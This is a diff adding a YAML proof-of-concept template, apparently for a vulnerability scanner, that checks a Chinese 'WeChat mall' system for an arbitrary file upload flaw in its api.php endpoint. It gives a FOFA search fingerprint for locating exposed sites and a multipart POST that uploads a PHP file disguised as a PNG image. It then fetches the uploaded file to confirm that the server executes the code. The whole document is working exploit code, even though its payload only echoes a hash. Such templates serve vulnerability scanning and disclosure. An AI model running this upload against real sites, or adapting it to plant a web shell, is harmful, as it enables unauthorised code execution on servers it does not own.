@@ -1,0 +1,41 @@
+id: poc-yaml-wechat-mall-api-anyfile-upload
+info:
+  name: 微商城系统 api.php接口存在任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 微商城系统
+  fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/api.php?mod=upload&type=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysml5dsBTMkgU6uGs
+  data: '------WebKitFormBoundarysml5dsBTMkgU6uGs
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundarysml5dsBTMkgU6uGs--
+
+    '
+  output:
+  - regex_match(body,`"name":"\\/upload\\/(?P<name>.*?).php`)
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /upload/{{.name}}.php
+  expression: 'status_code == 200 &&
+
+    body == t2
+
+    '
+transport: http
